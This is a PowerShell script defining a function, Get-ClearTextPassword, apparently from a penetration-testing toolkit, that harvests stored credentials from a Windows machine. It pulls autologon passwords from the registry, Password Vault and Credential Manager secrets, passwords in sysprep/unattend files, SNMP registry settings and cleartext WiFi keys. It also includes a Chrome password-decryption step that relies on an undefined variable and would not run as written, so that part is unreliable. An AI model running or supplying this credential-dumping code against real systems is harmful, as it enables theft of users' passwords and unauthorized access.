Function Get-ClearTextPassword {
<#
.SYNOPSIS
This cmdlet is used to obtain clear text passwords from cached locations as well as the from the Windows Registry


.DESCRIPTION
Return cached passwords for the current user, WiFi passwords, SNMP passwords, and web browser passwords


.PARAMETER All
This switch parameter indicates you want to return all stored and saved credentials.

.PARAMETER AutoLogon
This switch parameter indicates you want to retrieve the autologon credentials

.PARAMETER PasswordVault
This switch parameter indicates the you want to retrieve saved passwords from the Windows Credential Vault

.PARAMETER CredentialManager
This switch parameter indicates you want to retrieve cached passwords from credential manager

.PARAMETER SNMP
This switch parameter indicates you want to retriene SNMP passwords from the registry

.PARAMETER Sysprep
This switch parameter indicates you want to search common sysprep files for clear text passwords

.PARAMETER Chrome
This switch parameter indicates you want to retireve saved Chrome passwords

.PARAMETER WiFi
This switch parameter indicates you want to retrieve WiFi passwords


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.LINK
https://osbornepro.com
https://writeups.osbornepro.com
https://encrypit.osbornepro.com
https://btpssecpack.osbornepro.com
https://github.com/tobor88
https://github.com/OsbornePro
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286


.INPUTS
None


.OUTPUTS
None
#>
    [CmdletBinding(DefaultParameterSetName='All')]
        param (
            [Parameter(
                ParameterSetName='All',
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$All,

            [Parameter(
                ParameterSetName='Defined',
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$AutoLogon,

            [Parameter(
                ParameterSetName='Defined',
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$PasswordVault,

            [Parameter(
                ParameterSetName='Defined',
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$CredentialManager,

            [Parameter(
                ParameterSetName='Defined',
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$Sysprep,

            [Parameter(
                ParameterSetName='Defined',
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$Chrome,

            [Parameter(
                ParameterSetName='Defined',
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$SNMP,

            [Parameter(
                ParameterSetName='Defined',
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$WiFi
        )  # End param


    If (($AutoLogon.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All')) {

        $AutoLoginPassword = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | Select-Object -Property "DefaultUserName","DefaultPassword"
        If (($AutoLoginPassword).DefaultPassword) {

            Write-Output -InputObject "Auto Login Credentials Found: "
            Write-Output -InputObject "$AutoLoginPassword"

        }  # End If

    }  # End If

    If (($PasswordVault.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All')) {

        Write-Verbose -Message "Checking for passwords in the Windows Password vault"
        [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }

    }  # End If


    If (($CredentialManager.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All')) {

        Write-Verbose "Checking Credential Manager for stored credentials"

        Install-Module -Name CredentialManager -Confirm:$True
        Import-Module -Name CredentialManager
        Get-StoredCredential | ForEach-Object { 
        
            $P = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.Password)
            Write-Output -InputObject "$($_.Username):$([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($P))"
            
        }  # End ForEach-Object

    }  # End If


    If (($Sysprep.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All')) {

        Write-Verbose -Message "Checking for passwords in common Sysprep file locations"
        $PassFiles = "C:\Windows\sysprep\sysprep.xml","C:\Windows\sysprep\sysprep.inf","C:\Windows\sysprep.inf","C:\Windows\Panther\Unattended.xml","C:\Windows\Panther\Unattend.xml","C:\Windows\Panther\Unattend\Unattend.xml","C:\Windows\Panther\Unattend\Unattended.xml","C:\Windows\System32\Sysprep\unattend.xml","C:\Windows\System32\Sysprep\unattended.xml","C:\unattend.txt","C:\unattend.inf"
        ForEach ($PassFile in $PassFiles) {

            If (Test-Path -Path $PassFile) {

                Get-Content -Path $PassFile | Select-String -Pattern "Password"

            }  # End If

        }  # End ForEach

    }  # End If


    If (($Chrome.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All')) {

        Write-Verbose -Message "Dumping passwords from Google Chrome"
        [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($DataRow.password_value,$Null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))

    }  # End If


    If (($SNMP.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All')) {

        Get-ChildItem -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP" -Recurse

    }  # End If


    If (($WiFi.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All')) {

        Write-Verbose -Message "Dumping WiFi passwords"
        (netsh wlan show profiles) | Select-String -Pattern "\:(.+)$" | ForEach-Object {$Name = $_.Matches.Groups[1].Value.Trim(); $_ } | ForEach-Object {(netsh wlan show profile name="$Name" key=clear)} | Select-String -Pattern "Key Content\W+\:(.+)$" | ForEach-Object {$Pass=$_.Matches.Groups[1].Value.Trim(); $_ } | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=$Name;PASSWORD=$Pass }} | Format-Table -AutoSize

    }  # End If

}  # End Function Get-ClearTextPassword
